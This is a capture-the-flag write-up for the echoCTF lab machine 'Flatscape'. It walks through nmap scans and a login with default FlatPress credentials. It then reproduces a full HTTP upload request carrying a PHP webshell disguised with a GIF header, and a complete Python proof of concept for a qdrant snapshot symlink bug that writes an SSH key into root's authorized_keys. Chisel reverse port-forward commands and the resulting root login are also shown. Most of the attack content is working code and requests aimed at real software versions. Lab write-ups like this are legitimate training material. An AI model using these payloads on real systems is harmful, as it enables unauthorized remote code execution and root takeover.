---
description: >-
  Flatscape echoCTF Machine
title: Flatscape (Intermediate)                # Add title here
date: 2025-02-21 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: [Default Credentials, Flatpress, File Upload, RCE, Qdrant]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Flatscape.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.225
```

### Content

- Default credentials
- Flatpress 1.2.1 - File upload bypass to RCE 
- Arbitrary file read and write during snapshot recovery in qdrant/qdrant

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.225
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.225 ()   Status: Up
Host: 10.0.160.225 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.225
Nmap scan report for 10.0.160.225
Host is up, received user-set (0.17s latency).
Scanned at 2025-02-21 12:48:23 EST for 41s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 86:58:01:67:8c:ef:84:ef:03:d1:1a:7c:e0:bd:c0:1f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOHn6jasDXyjx9EVJ/30z5M/kHemfOGNAeqQiqYpWrHm
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.61 ((Debian))
|_http-generator: FlatPress fp-1.2.1
|_http-favicon: Unknown favicon MD5: 315957B26C1BD8805590E36985990754
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: FlatPress
| http-methods: 
|_  Supported Methods: GET
```
### Exploitation
There is only HTTP port open which has a web page only with a FlatPress CMS running on it:

![](/assets/img/Pasted-image-20250221121419.png)

Looking for exploits on this CMS, we identified the following [Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152)

Now, the important thing here is that the exploit requires authentication, the required credentials for this one are `admin:password`, the exploit is basically follow this 3 steps:
1) Login to the application
2) Navigate to the uploader section of the application.
3) Create a PHP file using the following payload.
```bash
GIF89a;
<?php system($_REQUEST["cmd"]); ?>
```

This way we will be able to upload the file using this HTTP request:
```bash
POST /admin.php?p=uploader&action=default HTTP/1.1
Host: 10.0.160.225
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------104014062942592053731161315153
Content-Length: 1831
Origin: http://10.0.160.225
DNT: 1
Connection: keep-alive
Referer: http://10.0.160.225/admin.php?p=uploader
Cookie: fpsess_fp-48ab49ba=147ei7sk0bbg5v2e3sq9kcvh3f; fpuser_fp-48ab49ba=admin; fppass_fp-48ab49ba=%242y%2410%2470xOuqovCQOI4BgCgjl5L.UBCur.JNrqAQGWfST9%2FI8C3c7OzHy0a
Upgrade-Insecure-Requests: 1

-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="_wpnonce"

f6cd998e05
-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="_wp_http_referer"

/admin.php?p=uploader
-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename="exploit.php"
Content-Type: application/x-php

GIF89a;
<?php system($_REQUEST["cmd"]); ?>

-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload[]"; filename=""
Content-Type: application/octet-stream


-----------------------------104014062942592053731161315153
Content-Disposition: form-data; name="upload"

Upload
-----------------------------104014062942592053731161315153--

```
Then all we ned to do is go to the uploaded exploit at:
```bash
http://10.0.160.225/fp-content/attachs/exploit.php?cmd=id
```
And you'll have a webshell.

### Privilege Escalation

Once you have command execution a simple privilege escalation was performed, running `ps -aux` command we can see that there is a process called `qdrant`:
```bash
www-data@flatscape:/var/www/html/fp-content/attachs$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2472   872 pts/0    Ss   17:31   0:00 tini -- /entrypoint.sh supervisord -c /etc/supervisord.conf
root           7  0.0  0.0   3924  2952 pts/0    S+   17:31   0:00 /bin/bash /entrypoint.sh supervisord -c /etc/supervisord.conf
root          20  0.0  0.3  36996 31484 pts/0    S+   17:31   0:00 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisord.conf
root          21  0.0  0.1  19032 14864 pts/0    S    17:31   0:00 /usr/bin/python3 /usr/bin/pidproxy /var/run/apache2/apache2.pid
root          22  0.0  0.9 146704 76828 pts/0    Sl   17:31   0:00 qdrant --config-path /etc/qdrant.yaml
```
Also by checking the open ports, there is a TCP-6333 open port:
```bash
www-data@flatscape:/var/www/html/fp-content/attachs$ ss -tulnp
Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process       
udp         UNCONN       0            0                      127.0.0.11:50939                    0.0.0.0:*                        
tcp         LISTEN       0            128                     127.0.0.1:6334                     0.0.0.0:*                        
tcp         LISTEN       0            1024                    127.0.0.1:6333                     0.0.0.0:*                        
tcp         LISTEN       0            4096                   127.0.0.11:39713                    0.0.0.0:*                        
tcp         LISTEN       0            128                       0.0.0.0:22                       0.0.0.0:*                        
tcp         LISTEN       0            511                       0.0.0.0:80                       0.0.0.0:*                        
tcp         LISTEN       0            128                          [::]:22                          [::]:*
```
Which is interesting enough, so I ran a wget command so I can see if there is a webapp running:
```bash
www-data@flatscape:/tmp$ wget http://127.0.0.1:6333
www-data@flatscape:/tmp$ cat index.html 
{"title":"qdrant - vector search engine","version":"1.8.4","commit":"984f55d6b9240b8c488a43c599958ad793ff0387"}
```
The details point to a qdrant version 1.8.4, looking for this software and version I found this article [Arbitrary file read and write during snapshot recovery in qdrant/qdrant](https://huntr.com/bounties/abd9c906-75ee-4d84-b76d-ce1386401e08), there is a way to write a file in the context of the user running this software, in this case all you need to do is to write the authorized_keys file using your public key on the `/root/.ssh` path, the article provides a script that is very useful for it:
```bash
cat exploitqdrantwrite.py 
# poc_write.py
import tarfile
from io import BytesIO
from random import randbytes
from pathlib import Path
from argparse import ArgumentParser
from requests import Session

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--url", default="http://localhost:6333")
    parser.add_argument("--remote_path", default="/root/.ssh/authorized_keys")
    parser.add_argument("--local_path", default="id_rsa.pub")
    args = parser.parse_args()

    cname = "c_" + randbytes(4).hex()

    remote_path = Path(args.remote_path)

    with Session() as s:
        # create a new collection:
        rsp = s.put(f"{args.url}/collections/{cname}", json={})

        # create and retrieve a snapshot:
        rsp = s.post(f"{args.url}/collections/{cname}/snapshots", json={})
        sname = rsp.json()["result"]["name"]

        rsp = s.get(f"{args.url}/collections/{cname}/snapshots/{sname}")
        snapshot = BytesIO(rsp.content)

        # create a fake tar with payload, you can also set custom file attributes
        # if you need the file to be executable, etc:
        fake_tar = BytesIO()
        with tarfile.open(fileobj=fake_tar, mode="w") as tar:
            tar.add(args.local_path, arcname=str(remote_path.name))

        # modify the snapshot to add a new segment .tar with a payload and a pre-existing
        # directory symlink with the same name (sans .tar);
        # during recovery process it will try to extract the contents of redirect.tar to redirect/
        with tarfile.open(fileobj=snapshot, mode="a") as tar:
            info = tarfile.TarInfo(f"0/segments/redirect.tar")
            info.size = len(fake_tar.getvalue())
            tar.addfile(info, fileobj=BytesIO(fake_tar.getvalue()))

            info = tarfile.TarInfo(f"0/segments/redirect")
            info.type = tarfile.SYMTYPE
            info.linkname = str(remote_path.parent)
            tar.addfile(info)

        rsp = s.post(f"{args.url}/collections/{cname}/snapshots/upload", files={
            "snapshot" : ("x.snapshot", snapshot.getvalue(), "application/tar")
        })

        rsp = s.delete(f"{args.url}/collections/{cname}/snapshots/{sname}")
        rsp = s.delete(f"{args.url}/collections/{cname}")
        rsp = s.delete(f"{args.url}/collections/{cname}/snapshots/x.snapshot")

```
Now, the problem with this script is that requires some libraries that are not available on the target machine, to bypass this we can use [Chisel](https://shuciran.github.io/posts/Chisel/) to forward the port TCP-6333 to our attacker machine:

Chisel as Server:
```bash
./chisel server --port 1337 --reverse
```

Chisel as client:
```bash
./chisel client 10.10.5.122:1337 R:6333:localhost:6333
```
That way, the port is reachable on our `localhost` port 6333 so we can execute the payload locally:
```bash
python3 exploitqdrantwrite.py
```
There is no output upon execution, but if you try to login using your private key, you'll have access as root:
```bash
ssh -i id_rsa root@10.0.160.225
root@flatscape:~# ls
ETSCTF_<REDACTED>
```

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`environment variables (env command)`
`/root`

### Credentials

### Notes

- Sometimes, several exploits are public for a given software, that's why is important to first identify the version to speed up the exploitation process.

### References
- [Flatpress 1.2.1 - File upload bypass to RCE](https://github.com/flatpressblog/flatpress/issues/152)
- [Arbitrary file read and write during snapshot recovery in qdrant/qdrant](https://huntr.com/bounties/abd9c906-75ee-4d84-b76d-ce1386401e08)
- [Chisel](https://shuciran.github.io/posts/Chisel/)

